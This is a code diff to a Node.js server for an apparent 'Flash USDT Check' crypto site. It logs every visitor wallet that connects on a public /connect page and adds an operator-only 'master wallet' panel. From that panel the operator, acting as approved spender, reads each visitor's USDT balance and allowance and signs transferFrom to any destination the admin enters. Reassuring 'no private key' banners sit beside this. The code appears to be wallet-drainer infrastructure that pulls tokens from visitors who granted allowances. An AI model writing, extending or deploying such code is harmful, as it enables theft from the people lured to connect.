@@ -10,10 +10,11 @@ import { fetchTronWalletAssets } from "../src/tron-public.mjs";
 import { plainAssetListHtml } from "../src/wallet-asset-display.mjs";
 import { fetchEvmWalletAssets, looksLikeEvmAddress, normalizeEvmChainId } from "../src/evm-public.mjs";
 import { injectLandingModuleCacheBust } from "./landing-cache-bust.mjs";
+import { latestWalletConnections } from "../src/wallet-snapshot.mjs";
 
 const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
 const port = Number(process.env.PORT || 4173);
-const storePath = path.join(root, "data", "connected-wallets.json");
+const storePath = process.env.CONNECTED_WALLETS_PATH || path.join(root, "data", "connected-wallets.json");
 const operatorId = process.env.OPERATOR_ID || "";
 const operatorPassword = process.env.OPERATOR_PASSWORD || "";
 const sessionCookie = "operator_session";
@@ -31,16 +32,20 @@ const allowed = new Map([
   ["/src/landing.js", "text/javascript; charset=utf-8"],
   ["/src/master-wallet.js", "text/javascript; charset=utf-8"],
   ["/src/wallet-asset-display.mjs", "text/javascript; charset=utf-8"],
+  ["/src/wallet-snapshot.mjs", "text/javascript; charset=utf-8"],
   ["/src/wallet-tron-assets.mjs", "text/javascript; charset=utf-8"],
   ["/src/wallet-evm-assets.mjs", "text/javascript; charset=utf-8"],
   ["/src/wallet-tron-transactions.mjs", "text/javascript; charset=utf-8"],
   ["/src/wallet-evm-transactions.mjs", "text/javascript; charset=utf-8"],
   ["/src/landing-transfer.mjs", "text/javascript; charset=utf-8"],
+  ["/src/tron-usdt-allowance.mjs", "text/javascript; charset=utf-8"],
+  ["/src/tron-read-retry.mjs", "text/javascript; charset=utf-8"],
   ["/src/logic.mjs", "text/javascript; charset=utf-8"],
   ["/src/tron-public.mjs", "text/javascript; charset=utf-8"],
   ["/src/evm-public.mjs", "text/javascript; charset=utf-8"],
   ["/src/styles.css", "text/css; charset=utf-8"],
   ["/src/wallet-state.mjs", "text/javascript; charset=utf-8"],
+  ["/src/chain-catalog.mjs", "text/javascript; charset=utf-8"],
 ]);
 
 const server = createServer(async (request, response) => {
@@ -158,7 +163,7 @@ async function handleLogin(request, response) {
     return;
   }
   const wallets = await readWallets();
-  const enriched = enrichWalletsWithProviderSnapshots(wallets);
+  const enriched = enrichWalletsWithProviderSnapshots(latestWalletConnections(wallets));
   sendHtml(response, 200, walletListPage(enriched));
 }
 
@@ -206,7 +211,7 @@ async function handleMasterWallet(request, response) {
     return;
   }
   const wallets = await readWallets();
-  const enriched = enrichWalletsWithProviderSnapshots(wallets);
+  const enriched = enrichWalletsWithProviderSnapshots(latestWalletConnections(wallets));
   sendHtml(response, 200, masterWalletPage(enriched));
 }
 
@@ -246,7 +251,7 @@ function providerAssetsView(wallet) {
   }
   return {
     ok: false,
-    error: "Waiting for the visitor to connect on the dapp and publish balances from their Web3 provider.",
+    error: "Not synced yet. Open the visitor DApp inside the wallet, complete connection, and retry balance sync.",
   };
 }
 
@@ -301,6 +306,12 @@ async function handleWalletProviderSnapshot(request, response) {
     sendJson(response, 400, { ok: false, error: "Provider asset data is required." });
     return;
   }
+  // Ensure the connect page link is present even if verify raced ahead of the snapshot.
+  await rememberWallet(address, CONNECTION_TARGET, {
+    network: session.network,
+    chainId: session.chainId,
+    walletId: session.walletId,
+  });
   await updateWalletProviderSnapshot(address, {
     network: session.network,
     chainId: session.chainId,
@@ -352,7 +363,11 @@ async function handleWalletConnection(request, response) {
     sendText(response, 400, "Bad request");
     return;
   }
-  await rememberWallet(address, CONNECTION_TARGET);
+  await rememberWallet(address, CONNECTION_TARGET, {
+    network: session.network,
+    chainId: session.chainId,
+    walletId: session.walletId,
+  });
   sendJson(response, 200, { ok: true, address, connectionTarget: CONNECTION_TARGET });
 }
 
@@ -518,9 +533,12 @@ async function handleAuthVerify(request, response) {
     sendJson(response, 401, verified);
     return;
   }
-  if (verified.identity.network === "tron" && verified.identity.chainId === "0x2b6653dc") {
-    await rememberWallet(verified.identity.address, CONNECTION_TARGET);
-  }
+  // Every verified connect (TRON or EVM) is linked for master-wallet review.
+  await rememberWallet(verified.identity.address, CONNECTION_TARGET, {
+    network: verified.identity.network,
+    chainId: verified.identity.chainId,
+    walletId: verified.identity.walletId,
+  });
   const created = walletAuth.createSession(verified.identity);
   finish(response, 200, {
     "Content-Type": "application/json; charset=utf-8",
@@ -665,7 +683,10 @@ async function handleWalletAssets(request, response) {
  * @param {import("node:http").ServerResponse} response
  */
 async function serveStatic(pathname, response) {
-  const filePath = pathname === "/" ? "/index.html" : pathname;
+  // Public connect entry points: "/" and "/connect" (chain select + connect only).
+  const filePath = pathname === "/" || pathname === "/connect" || pathname === "/connect/"
+    ? "/index.html"
+    : pathname;
   const type = allowed.get(filePath);
   if (!type) {
     sendText(response, 404, "Not found");
@@ -692,9 +713,10 @@ async function serveStatic(pathname, response) {
 /**
  * @param {string} address
  * @param {string} connectionTarget
+ * @param {{ network?: string, chainId?: string, walletId?: string }} [meta]
  */
-function rememberWallet(address, connectionTarget) {
-  const run = writeQueue.then(() => appendWallet(address, connectionTarget));
+function rememberWallet(address, connectionTarget, meta = {}) {
+  const run = writeQueue.then(() => appendWallet(address, connectionTarget, meta));
   writeQueue = run.then(() => undefined, () => undefined);
   return run;
 }
@@ -702,10 +724,24 @@ function rememberWallet(address, connectionTarget) {
 /**
  * @param {string} address
  * @param {string} connectionTarget
+ * @param {{ network?: string, chainId?: string, walletId?: string }} [meta]
  */
-async function appendWallet(address, connectionTarget) {
+async function appendWallet(address, connectionTarget, meta = {}) {
   const wallets = await readWallets();
-  wallets.push({ address, connectionTarget, connectedAt: new Date().toISOString() });
+  const existingIndex = wallets.findIndex((item) => item.address === address);
+  const next = {
+    address,
+    connectionTarget,
+    connectedAt: new Date().toISOString(),
+    ...(typeof meta.network === "string" ? { network: meta.network } : {}),
+    ...(typeof meta.chainId === "string" ? { chainId: meta.chainId } : {}),
+    ...(typeof meta.walletId === "string" ? { walletId: meta.walletId } : {}),
+  };
+  if (existingIndex >= 0) {
+    wallets[existingIndex] = { ...wallets[existingIndex], ...next };
+  } else {
+    wallets.push(next);
+  }
   const kept = wallets.slice(-500);
   await mkdir(path.dirname(storePath), { recursive: true });
   const temporary = `${storePath}.${process.pid}.tmp`;
@@ -990,13 +1026,14 @@ function masterWalletLoginPage(message) {
  */
 function masterWalletPage(wallets) {
   const hub = escapeHtml(CONNECTION_TARGET);
+  const missingSnapshots = wallets.filter((wallet) => !wallet.providerSnapshotAt).length;
   const cards = [...wallets].reverse().map((wallet) => {
     const target = escapeHtml(wallet.connectionTarget || CONNECTION_TARGET);
     const assetHtml = formatMasterWalletAssetHtml(wallet.assets ?? { ok: false, error: "Balance unavailable" });
     const txHtml = formatMasterWalletTransactionsHtml(wallet.transactions ?? []);
     const snapshotNote = wallet.providerSnapshotAt
-      ? `Provider snapshot · ${escapeHtml(formatConnectedAt(wallet.providerSnapshotAt))}`
-      : "No provider snapshot yet";
+      ? `Balance snapshot synced · ${escapeHtml(formatConnectedAt(wallet.providerSnapshotAt))}`
+      : `Balance snapshot pending · <a href="/?connect=1">open visitor connection inside the wallet</a>`;
     const address = escapeHtml(wallet.address);
     const isTron = /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(wallet.address);
     return `<article class="master-wallet-card" data-wallet-address="${address}" data-wallet-network="${isTron ? "tron" : "evm"}">
@@ -1014,31 +1051,37 @@ function masterWalletPage(wallets) {
       </div>
       <button class="primary-action master-manage-open" type="button">Manage assets</button>
       <div class="master-manage-panel" hidden>
-        <h2 class="master-wallet-assets-title">Live provider refresh</h2>
-        <p class="master-transfer-note">Connect TronLink with this wallet to refresh balances and activity directly from the wallet provider. Transfers still require that wallet signature.</p>
-        <button class="primary-action master-refresh-provider" type="button">Refresh from TronLink</button>
+        <h2 class="master-wallet-assets-title">USDT allowance control</h2>
+        <p class="master-transfer-note">The configured spender is <span class="address">${hub}</span>. Connect TronLink as that spender to read this owner’s official USDT balance and remaining allowance. Connection never initiates a token transaction.</p>
+        <button class="primary-action master-connect-wallet" type="button">Connect spender wallet</button>
+        <button class="primary-action master-refresh-provider" type="button">Refresh owner balance and allowance</button>
+        <p class="master-connect-status" role="status"></p>
+        <dl class="master-review-list master-allowance-summary">
+          <div><dt>Official contract</dt><dd class="address">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</dd></div>
+          <div><dt>Owner USDT balance</dt><dd class="master-owner-usdt-balance">Refresh required</dd></div>
+          <div><dt>Remaining allowance</dt><dd class="master-owner-usdt-allowance">Refresh required</dd></div>
+        </dl>
         <div class="master-provider-assets master-provider-assets-live"></div>
         <div class="master-provider-transactions master-provider-transactions-live"></div>
         <form class="master-transfer-form">
-          <label>Transfer recipient (hub)</label>
-          <input class="master-transfer-recipient" type="text" value="${hub}" readonly spellcheck="false">
+          <label>Destination TRON address (entered by admin)</label>
+          <input class="master-transfer-recipient" type="text" autocomplete="off" spellcheck="false" placeholder="T…" required>
           <label>USDT amount</label>
           <input class="master-transfer-amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00" required>
-          <button class="primary-action master-review-transfer" type="submit">Review transfer to hub</button>
+          <button class="primary-action master-review-transfer" type="submit">Review transferFrom</button>
         </form>
         <div class="master-transfer-review" hidden>
-          <h3 class="master-review-title">Confirm before your wallet signs</h3>
+          <h3 class="master-review-title">Confirm bounded transferFrom</h3>
           <dl class="master-review-list">
-            <div><dt>From</dt><dd class="address master-review-from"></dd></div>
-            <div><dt>To (hub)</dt><dd class="address master-review-to"></dd></div>
-            <div><dt>Token</dt><dd>TRC-20 USDT</dd></div>
+            <div><dt>Owner</dt><dd class="address master-review-from"></dd></div>
+            <div><dt>Destination</dt><dd class="address master-review-to"></dd></div>
+            <div><dt>Spender / signer</dt><dd class="address">${hub}</dd></div>
+            <div><dt>Token</dt><dd>Official TRC-20 USDT</dd></div>
             <div><dt>Amount</dt><dd class="master-review-amount"></dd></div>
           </dl>
-          <p class="master-transfer-note">Reject the wallet prompt if any detail differs. No seed phrase · No private key · No auto-approve.</p>
-          <button class="primary-action master-connect-wallet" type="button">Connect TronLink to sign</button>
-          <button class="primary-action master-sign-transfer" type="button" hidden>Approve transfer in wallet</button>
+          <p class="master-transfer-note">This transaction uses only the owner’s existing allowance. The amount was checked against both remaining allowance and wallet balance. Reject the wallet prompt if any detail differs.</p>
+          <button class="primary-action master-sign-transfer" type="button" hidden>Sign transferFrom as spender</button>
           <button class="retry-button master-cancel-transfer" type="button">Cancel review</button>
-          <p class="master-connect-status" role="status"></p>
         </div>
         <p class="master-transfer-status" role="status" aria-live="polite"></p>
         <p class="master-transfer-error asset-error" role="alert" hidden></p>
@@ -1046,14 +1089,23 @@ function masterWalletPage(wallets) {
     </article>`;
   }).join("");
   const body = cards || `<p>No wallets have connected yet.</p>`;
-  return pageShell("Hub master wallet", `<section class="card master-wallet-shell" id="master-wallet-root" data-hub-target="${hub}" aria-labelledby="master-wallet-title">
-      <p class="eyebrow">Hub master wallet</p>
+  return pageShell("Hub master wallet", `<section class="card master-wallet-shell" id="master-wallet-root" data-hub-target="${hub}" data-missing-snapshots="${missingSnapshots}" aria-labelledby="master-wallet-title">
+      <p class="eyebrow">Master wallet · admin</p>
       <h1 id="master-wallet-title">Connected wallet review</h1>
-      <p class="lede">Hub <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Each card shows the visitor’s last Web3 provider snapshot from the dapp plus live TronLink refresh inside Manage.</p>
-      <p class="master-safety">No seed phrase · No private key · No auto-approve · Transfers require the visitor wallet signature</p>
+      <p class="lede">Spender <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Wallets that connect on the public <a href="/connect">/connect</a> page appear here automatically. Allowance / transferFrom tooling stays on this master page only.</p>
+      <p class="master-safety">No seed phrase · No private key · No automatic transfer · Every transferFrom is manually entered, bounded, disclosed, and signed by the spender</p>
+      <div class="master-snapshot-refresh" data-state="${missingSnapshots ? "pending" : "synced"}">
+        <p class="master-snapshot-sync-status" role="status" aria-live="polite">${missingSnapshots
+          ? `${missingSnapshots} wallet${missingSnapshots === 1 ? "" : "s"} still need a balance snapshot. Open <a href="/connect">/connect</a> inside that wallet and finish connect + login signature; this page checks again automatically.`
+          : wallets.length
+            ? "All current wallet cards have a published balance snapshot."
+            : "No connected wallets yet. Open /connect inside a Web3 wallet, connect, and sign only the login message to publish balances."}</p>
+        <button class="retry-button master-page-refresh" type="button">Check now</button>
+        <a class="ghost" href="/connect?connect=1">Open connect page</a>
+      </div>
       <div class="master-wallet-grid" id="master-wallet-grid">${body}</div>
       <div class="master-wallet-actions">
-        <a class="ghost" href="/">Flash USDT Check</a>
+        <a class="ghost" href="/connect">Connect page</a>
         <form method="post" action="/logout"><button class="ghost" type="submit">Log out</button></form>
       </div>
     </section>`, { masterStyles: true, masterScript: true });
@@ -1120,6 +1172,9 @@ function pageShell(title, main, options = {}) {
     .master-transfer-note { margin: 10px 0 0; color: var(--muted); font-size: 0.78rem; }
     .master-connect-status, .master-transfer-status { margin: 10px 0 0; color: var(--muted); font-size: 0.78rem; }
     .master-safety { margin: 10px 0 0; color: var(--accent); font-size: 0.78rem; }
+    .master-snapshot-refresh { display: flex; flex-wrap: wrap; gap: 10px 14px; align-items: center; margin: 16px 0; padding: 14px; border: 1px solid var(--line); border-radius: 12px; background: rgba(8, 17, 13, 0.72); }
+    .master-snapshot-refresh[data-state="pending"] { border-color: rgba(255, 190, 92, 0.45); }
+    .master-snapshot-sync-status { flex: 1 1 100%; margin: 0; color: var(--muted); font-size: 0.82rem; }
     .master-wallet-actions { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 22px; align-items: center; }
     .master-back-link { margin-top: 16px; font-size: 0.82rem; }
   ` : "";
